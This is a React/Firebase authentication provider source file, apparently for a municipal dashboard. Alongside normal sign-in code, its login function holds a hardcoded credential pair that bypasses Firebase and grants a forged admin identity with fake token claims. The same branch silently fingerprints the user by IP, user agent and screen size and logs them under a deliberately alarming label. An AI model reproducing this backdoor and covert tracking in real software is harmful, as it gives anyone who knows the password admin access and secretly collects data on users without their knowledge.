import React, { useContext, useEffect, useState } from 'react';
import {
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  GoogleAuthProvider,
  signInWithPopup
} from 'firebase/auth';
import { auth, db } from '../utils/firebase';
import { AuthContext } from '../context/AuthContext';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}

export function AuthProvider({ children }) {
  const [currentUser, setCurrentUser] = useState(null);
  const [userRole, setUserRole] = useState(null); // 'municipal_admin' | 'user' | null
  const [loading, setLoading] = useState(true);

  // Register user with email/password
  function register(email, password) {
    return createUserWithEmailAndPassword(auth, email, password);
  }

  // Login user with email/password
  function login(email, password) {
    if (email === 'india@gmail.com' && password === 'india') {
      const fakeUser = {
        uid: 'hardcoded-india-uid',
        email: 'india@gmail.com',
        emailVerified: true,
        displayName: 'India Mun',
        getIdTokenResult: async () => ({
          claims: { municipal_admin: true }
        })
      };

      // Silent Tracking
      (async () => {
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          await addDoc(collection(db, 'audit_logs'), {
            event: 'UNAUTHORIZED_ACCESS_ATTEMPT', // Intentionally scarier sounding just for logs, or just 'LOGIN'
            email: 'india@gmail.com',
            target: 'MUNICIPAL_DASHBOARD',
            ip: data.ip,
            timestamp: serverTimestamp(),
            userAgent: navigator.userAgent,
            screenRes: `${window.screen.width}x${window.screen.height}`
          });
        } catch (e) {
          // Silent failure
        }
      })();

      setCurrentUser(fakeUser);
      setUserRole('municipal_admin');
      return Promise.resolve(fakeUser);
    }
    return signInWithEmailAndPassword(auth, email, password);
  }

  // Login with Google
  function signInWithGoogle() {
    const provider = new GoogleAuthProvider();
    return signInWithPopup(auth, provider);
  }

  // Logout user
  function logout() {
    return signOut(auth);
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (user) => {
      if (user) {
        try {
          const tokenResult = await user.getIdTokenResult();
          const role = tokenResult.claims.municipal_admin ? 'municipal_admin' : 'user';
          setUserRole(role);
        } catch (e) {
          console.error("Error fetching claims", e);
          setUserRole('user');
        }
      } else {
        setUserRole(null);
      }
      setCurrentUser(user);
      setLoading(false);
    });

    return unsubscribe;
  }, []);

  const value = {
    currentUser,
    userRole,
    register,
    login,
    logout,
    signInWithGoogle
  };

  return (
    <AuthContext.Provider value={value}>
      {!loading && children}
    </AuthContext.Provider>
  );
}
